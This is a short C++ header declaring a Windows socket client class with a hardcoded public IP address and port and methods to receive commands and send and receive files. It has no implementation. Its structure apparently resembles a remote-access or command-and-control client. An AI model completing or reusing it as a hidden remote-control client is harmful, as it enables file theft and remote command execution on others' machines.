#pragma once
#include <WS2tcpip.h>
#include <string>
using namespace std;
#define IP "52.231.191.64"
#define PORT "1457"

class Core
{
	int remote_id;
	SOCKET client_socket = INVALID_SOCKET;
public:
	~Core();
	void connect_to_server();
	bool send_response(string&);
	bool recieve_command(string&);
	bool send_file(string filepath);
	bool recieve_file();
};